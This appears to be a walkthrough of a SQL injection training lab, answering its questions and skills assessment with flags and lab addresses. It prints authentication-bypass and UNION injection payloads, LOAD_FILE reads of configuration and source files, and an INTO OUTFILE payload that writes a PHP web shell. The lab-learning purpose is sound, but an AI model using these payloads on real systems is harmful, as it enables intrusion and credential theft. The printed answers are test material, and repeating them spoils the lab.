
---

## Question 1: Connect to the Database and Find the First Database Name

The task is to use the MySQL client from the command line to connect to the database and identify the first database name.

```bash
mysql -u root -h 94.237.55.160 -P 44716 -p
```

Enter password:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution
```

List the databases:

```sql
MariaDB [(none)]> show databases;
```

```
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set
```

From the output, the name of the first database is **employees**.

---

## Question 2: Find the Department Number for the “Development” Department

Select the `employees` database and list the tables:

```sql
MariaDB [(none)]> use employees;
MariaDB [employees]> show tables;
```

```
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
```

Query the `departments` table:

```sql
MariaDB [employees]> select * from departments;
```

```
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
```

From the output, the department number for the **Development** department is **d005**.

---

## Question 3: Find the Last Name of an Employee

Find the last name of an employee whose first name starts with **“Bar”** and who was hired on **1990-01-01**.

```sql
MariaDB [employees]> SELECT last_name 
FROM employees 
WHERE first_name LIKE 'Bar%' 
AND hire_date='1990-01-01';
```

```
+-----------+
| last_name |
+-----------+
| Mitchem   |
+-----------+
1 row in set
```

The employee’s last name is **Mitchem**.

---

## Question 4: Count Records Based on Certain Criteria

Determine the number of records in the `titles` table where the employee number is greater than 10000 **or** the title does not contain the word “engineer”.

List the databases:

```sql
MariaDB [(none)]> show databases;
```

```
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Execute the count query:

```sql
MariaDB [(none)]> SELECT COUNT(*) 
FROM employees.titles 
WHERE emp_no > 10000 
OR title NOT LIKE '%engineer%';
```

```
+----------+
| COUNT(*) |
+----------+
|      654 |
+----------+
```

The number of records satisfying the criteria is **654**.

---

## Question 5: Log in as the User “tom”

Log in as the user **tom** and retrieve the flag after a successful login.

SQL injection payload:

```
tom' or '1'='1
```

Password:

```
asdfasdfsad
```

Flag obtained after successful login:

```
202a1d1a8b195d5e9a57e434cc16000c
```

This payload exploits a SQL injection vulnerability by injecting a condition that always evaluates to true, bypassing authentication.

---

## Question 6: Log in as a Specific User to Retrieve the Flag

Log in as a user with ID **5** to retrieve the flag.

SQL injection payload:

```
'or id=5)#
```

Password:

```
safdsafsd
```

Flag retrieved:

```
cdad9ecdf6f14b45ff5c4de32909caec
```

This input manipulates the SQL query to bypass authentication and log in as the specified user.

---

## Question 7: Perform a UNION Query on Multiple Tables

Find the number of records returned when performing a `UNION` of all records in the `employees` table and the `departments` table.

Select the database and list tables:

```sql
MariaDB [(none)]> use employees;
MariaDB [employees]> show tables;
```

View table contents:

```sql
MariaDB [employees]> select * from employees;
```

```
654 rows in set
```

```sql
MariaDB [employees]> select * from departments;
```

```
9 rows in set
```

Perform the UNION query:

```sql
MariaDB [employees]> 
SELECT emp_no,birth_date,first_name,last_name,gender,hire_date FROM employees
UNION
SELECT dept_no, dept_name,1,1,1,1 FROM departments--;
```

```
663 rows in set
```

After performing the UNION, the total number of records is **663**.

---

## Question 8: Retrieve the Result of `user()`

Extract the result of the `user()` function using SQL injection.

Payload:

```
cn' UNION select 1,user(),3,4-- -
```

Result:

```
root@localhost
```

The current database user is **root@localhost**.

---

## Question 9: Retrieve the Password Hash for “newuser”

Obtain the password hash for the user **newuser** from the `users` table.

Payload:

```
cn' UNION select 1, username, password, 4 from users--
```

Password hash retrieved:

```
9da2c9bcdf39d8610954e0e11ea8f45f
```

---

## Question 10: Discover the Database Password

Retrieve the database password by reading PHP configuration files.

Payloads used:

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4 -- -
```

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4 -- -
```

Database password found:

```
dB_pAssw0rd_iS_flag!
```

---

## Question 11: Retrieve the Flag Using a Webshell

Use the provided webshell to explore the filesystem and retrieve the flag.

Commands executed:

```
http://94.237.61.76:42652/shell.php?0=ls
```

```
http://94.237.61.76:42652/shell.php?0=pwd
```

```
http://94.237.61.76:42652/shell.php?0=/var/www/html
```

```
http://94.237.61.76:42652/shell.php?0=/var/www/flag.txt
```

Flag retrieved:

```
d2b5b27ae688b6a0f1d21b7d3a0798cd
```


## Question:

**What is the password hash for the user `admin`? What is the root path of the web application? Achieve remote code execution and submit the contents of `/flag_XXXXXX.txt`.**

---

### Initial Access & SQL Injection Entry Point

Visit the registration page:

```
http://ip:port/register.php
```

The invitation code field requires a specific format, which makes it impossible to directly modify it for SQL injection in the browser. To work around this, Burp Suite is used to intercept the request and manually inject a payload. This allows bypassing the invitation code check using:

```
' OR '1'='1
```

After successfully bypassing the check, an **“account created successfully”** message is returned in the response headers. Once this happens, the browser loads the next page.

Input fields, URLs, and even headers are common injection points. In this case, the **conversation search box** acts as an input field that sends queries to the database and returns results, making it a valid SQL injection point.

---

### Determining the Number of Columns

A test payload is used to identify the number of columns:

```
SELECT 1,2,3,4
```

Since values **3** and **4** are reflected in the response, the backend query is confirmed to use **four columns**, with the **third and fourth columns displayed** in the output.

Several payloads were tested earlier without success. The payload starting with `cn')` finally worked, confirming that it successfully breaks out of the original SQL statement.

---

### Backend Query Structure (Inferred)

Based on observed behavior, the backend query likely looks like this:

```
SELECT message 
FROM msgdb 
WHERE (user='admin' AND data LIKE '%search%');
```

To exploit SQL injection, the payload must break out of the closing quote and parenthesis in the `user` field. The injected query becomes:

```
SELECT message 
FROM msgdb 
WHERE (user='admin' AND data LIKE 'cn') 
UNION SELECT 1,2,3,4 -- ');
```

---

### Database Enumeration

#### Enumerate Databases

```
') UNION SELECT NULL,NULL,SCHEMA_NAME,NULL 
FROM INFORMATION_SCHEMA.SCHEMATA;-- -
```

Databases found:

* information_schema
* chattr

---

#### Enumerate Tables

```
') UNION SELECT NULL,NULL,TABLE_NAME,TABLE_SCHEMA 
FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='chattr';-- -
```

Tables found:

* Users
* InvitationCodes
* Messages

---

#### Enumerate Columns

```
') UNION SELECT NULL,NULL,COLUMN_NAME,TABLE_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE table_name='Users'; -- -
```

Columns found:

* UserID
* Username
* Password
* InvitationCode
* AccountCreated

---

### Retrieve Admin Password Hash

```
') UNION SELECT NULL,NULL,Username,Password 
FROM Users 
WHERE Username='admin'; -- -
```

Password hash for user **admin**:

```
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

The application uses **Argon2**, which is resistant to brute-force cracking. Obvious credentials were not tested, as the focus of this writeup is SQL injection.

---

### Identifying File Read Capabilities

Determine which database user is executing queries:

```
') UNION SELECT NULL,NULL,USER(),NULL; -- -
```

Result:

```
chattr_dbUser@localhost
```

Check database privileges:

```
') UNION SELECT NULL,NULL,grantee,privilege_type 
FROM information_schema.user_privileges 
WHERE grantee="'chattr_dbUser'@'localhost'";
```

The user has file read permissions, allowing access to server configuration files.

---

### Finding the Web Root Path

Attempt to read the Nginx configuration file:

```
') UNION SELECT NULL,NULL,LOAD_FILE('/etc/nginx/nginx.conf'),NULL; -- -
```

The configuration references `sites-enabled`. Since Nginx does not specify a default site filename, Ubuntu documentation is used for guidance.

Read the default site configuration:

```
') UNION SELECT NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default'),NULL; -- -
```

From this file, the **root path of the web application** is identified as:

```
/var/www/chattr-prod
```

---

### Reading Application Source Code

Read the main application file:

```
') UNION SELECT NULL,NULL,NULL,
LOAD_FILE('/var/www/chattr-prod/index.php');-- -
```

Other included files are enumerated in the same way until database credentials and application logic are fully understood.

---

### Achieving Remote Code Execution (Web Shell)

With the root path known, a PHP web shell is written to disk:

```
') UNION SELECT "","","",
'<?php system($_REQUEST["cmd"]); ?>' 
INTO OUTFILE '/var/www/chattr-prod/websh.php'; -- -
```

The web shell is then used to locate and read the flag file.

---

### Flag Retrieval

Flag file identified:

```
/flag_876a4C.txt
```

Flag contents:

```
061b1aeb94dec6bf5d9c27032b3c1d8d
```

---

### Final Answers

* **Admin password hash:**
  `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

* **Web application root path:**
  `/var/www/chattr-prod`

* **Flag:**
  `061b1aeb94dec6bf5d9c27032b3c1d8d`

---